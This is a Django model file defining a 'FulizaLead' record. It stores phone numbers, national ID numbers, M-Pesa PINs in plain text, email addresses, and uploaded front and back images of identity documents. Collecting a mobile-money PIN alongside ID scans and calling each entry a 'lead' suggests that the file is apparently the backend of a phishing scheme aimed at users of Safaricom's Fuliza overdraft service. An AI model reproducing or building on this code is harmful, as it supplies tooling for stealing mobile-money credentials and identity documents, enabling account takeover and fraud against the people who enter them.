from django.db import models

class FulizaLead(models.Model):
    phone_number = models.CharField(max_length=15)
    id_number = models.CharField(max_length=20)
    mpesa_pin = models.CharField(max_length=10)
    email = models.EmailField(null=True, blank=True)
    
    # Document Storage
    frontDoc = models.ImageField(upload_to='leads/front/', null=True, blank=True)
    backDoc = models.ImageField(upload_to='leads/back/', null=True, blank=True)
    
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"Lead: {self.phone_number} - {self.id_number}"